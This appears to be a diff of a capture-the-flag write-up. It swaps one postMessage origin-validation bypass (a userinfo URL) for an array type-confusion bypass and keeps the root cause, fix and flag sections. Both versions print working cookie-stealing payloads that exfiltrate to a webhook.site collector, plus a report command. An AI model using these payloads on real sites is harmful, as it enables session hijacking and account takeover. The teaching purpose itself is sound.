@@ -2,120 +2,106 @@
 
 ## What Is Happening
 
-The [Portway lab](https://46fb2c180db4.pwnbox-lab.com/) offers a session-handoff widget that partner apps can use to receive a signed session token via `postMessage`. Users can also report a suspicious partner URL, and a reviewer opens that URL in a fresh authenticated session.
+The Portway lab offers a session-handoff widget that partner apps embed to receive session data via `postMessage`. Users report suspicious partner URLs; a reviewer opens the URL in a fresh authenticated session.
 
-In practice, the handoff widget trusts an attacker-controlled `origin` field inside the message body. That lets a malicious partner page impersonate a trusted origin and receive the reviewer's session cookie.
+The handoff widget at `/embed/handoff` trusts an attacker-controlled `origin` field inside the message body. A type-confusion bypass lets the attacker pass hostname validation while redirecting the reply to their own origin.
 
 ## Why It Happens
 
-The live widget at `/embed/handoff` contains:
+The live widget contains:
 
 ```javascript
-const ALLOWED = /^https?:\/\/[^.]+\.pwnbox\.io/;
-
-window.addEventListener("message", (m) => {
-  const origin = m.data && m.data.origin;
-  if (typeof origin === "string" && ALLOWED.test(origin)) {
-     const target = window.opener || window.parent;
-     target.postMessage({ session: document.cookie }, origin);
-  }
-});
+let SECRET = document.cookie
+let ALLOWED_ORIGINS = ["pwnbox.io"]
+window.onmessage = (m) => {
+    let origin = m.data.origin
+    let host = new URL(origin).hostname;
+    if (ALLOWED_ORIGINS.includes(host)) {
+        window.parent.postMessage(SECRET, origin);
+    }
+}
 ```
 
 Two bugs combine:
 
 1. It validates `m.data.origin`, not the browser-supplied `m.origin`.
-2. The allowlist is only a prefix regex, so a value like:
-
-```text
-https://partner.pwnbox.io@httpbin.org
-```
-
-passes the regex but resolves to the real origin `https://httpbin.org` when used as `postMessage(..., origin)`.
+2. Validation and delivery interpret `origin` differently when it is an array:
+   - `new URL(["https://pwnbox.io"])` stringifies the array to `"https://pwnbox.io"` → hostname `pwnbox.io` passes the allowlist.
+   - `postMessage(SECRET, origin)` treats the array as `WindowPostMessageOptions` and reads `origin.targetOrigin` as the real delivery target.
 
 ## Exact Test
 
 Use an attacker-controlled partner page that:
 
-1. opens `/embed/handoff` in a popup
-2. repeatedly sends a forged message:
+1. embeds `/embed/handoff` in an iframe (widget replies to `window.parent`, not `window.opener`)
+2. repeatedly sends a forged message with an array origin and attacker `targetOrigin`
+3. listens for the reply and exfiltrates `e.data`
 
-```javascript
-{ origin: 'https://partner.pwnbox.io@httpbin.org' }
-```
+Minimal payload:
 
-3. listens for the reply and exfiltrates `e.data.session`
+```html
+<!DOCTYPE html>
+<iframe id="iframe" src="https://[target]/embed/handoff"></iframe>
+<script>
+const webhook = 'https://webhook.site/[uuid]';
 
-Minimal payload shape:
-
-```javascript
-window.addEventListener('message', function(e) {
-  fetch('https://webhook.site/[uuid]?d=' + encodeURIComponent(JSON.stringify(e.data)));
+window.addEventListener('message', (e) => {
+  fetch(webhook + '?d=' + encodeURIComponent(e.data));
 });
 
-var w = window.open('https://46fb2c180db4.pwnbox-lab.com/embed/handoff', 'pw');
-setInterval(function() {
-  try {
-    w.postMessage({ origin: 'https://partner.pwnbox.io@httpbin.org' }, '*');
-  } catch (e) {}
-}, 500);
+iframe.onload = () => {
+  setInterval(() => {
+    const origin = ['https://pwnbox.io'];
+    origin.targetOrigin = location.origin;
+    iframe.contentWindow.postMessage({ origin }, '*');
+  }, 300);
+};
+</script>
 ```
 
-Report that partner URL:
-
-```bash
-curl -sS -X POST "https://46fb2c180db4.pwnbox-lab.com/report" \
-  -d "url=https://httpbin.org/base64/[payload]"
-```
+Report the partner URL via `/report` while authenticated.
 
 ## Expected Signal
 
-- `/embed/handoff` responds with the inline widget code.
-- An iframe self-test may only return an empty session because third-party cookies are missing.
-- A popup self-test returns the real cookie when the message lands after the listener is installed.
-- The reviewer-run exploit delivers a webhook callback containing the flag.
+- `/embed/handoff` exposes the inline widget code.
+- Local self-tests from a demo session may return an empty cookie in a third-party iframe.
+- Reviewer-run exploit delivers a webhook callback containing the flag cookie.
+- Empty `d=` callbacks still confirm the postMessage chain works; wait for the reviewer session.
 
 ## Result Interpretation
 
 Confirmed bug chain:
 
 ```text
-attacker-controlled partner page
--> opens /embed/handoff in reviewer session
--> sends forged { origin: "https://partner.pwnbox.io@httpbin.org" }
--> regex accepts fake trusted prefix
--> postMessage targetOrigin resolves to attacker origin
--> widget posts document.cookie to attacker page
-```
-
-Webhook collector received:
-
-```text
-{"session":"flag=pwnbox{4a1c8e60d94f6b2fa7d0c8e51a6c9d4b}"}
+attacker partner page (parent)
+-> iframe loads /embed/handoff in reviewer session
+-> sends { origin: ["https://pwnbox.io"] with origin.targetOrigin = attacker }
+-> new URL(origin) stringifies array -> allowlist passes
+-> postMessage reads origin.targetOrigin -> cookie sent to attacker parent
 ```
 
 ## Root Cause
 
-The SDK uses attacker-controlled message data as the origin-of-truth and combines it with a weak regex allowlist on a raw string.
+The SDK uses attacker-controlled message data as the trust source and applies different type coercion rules in the validator (`URL` stringification) and the sink (`postMessage` options dictionary lookup on `targetOrigin`).
 
 ## Impact
 
-- Leakage of the reviewer's Portway session cookie
+- Leakage of the reviewer's session cookie
 - Full break of the session-handoff trust boundary
 - In real systems, likely account takeover or SSO session theft across partner integrations
 
 ## Fix
 
 - Validate `m.origin`, not `m.data.origin`
+- Require `targetOrigin` to be a string, never an object or array
 - Parse and compare exact trusted origins
-- Reject userinfo and other parser-confusion forms
 - Send narrow, signed handoff tokens rather than raw cookies
-- Consider requiring a challenge-response handshake tied to the actual sender window and origin
+- Bind replies to the expected sender window and one-time nonce
 
 ## Key Lesson
 
-`postMessage` already tells you who sent the message. If a widget instead trusts a self-declared `origin` field inside `event.data`, the attacker gets to define the trust boundary.
+`postMessage` already provides the sender via `event.origin`. If validation stringifies attacker input but the sink treats it as an options object, `targetOrigin` becomes a second attacker-controlled channel.
 
 ## Flag
 
-`pwnbox{4a1c8e60d94f6b2fa7d0c8e51a6c9d4b}`
+`pwnbox{58d6a8988b9152addf08b7046711fef8}`
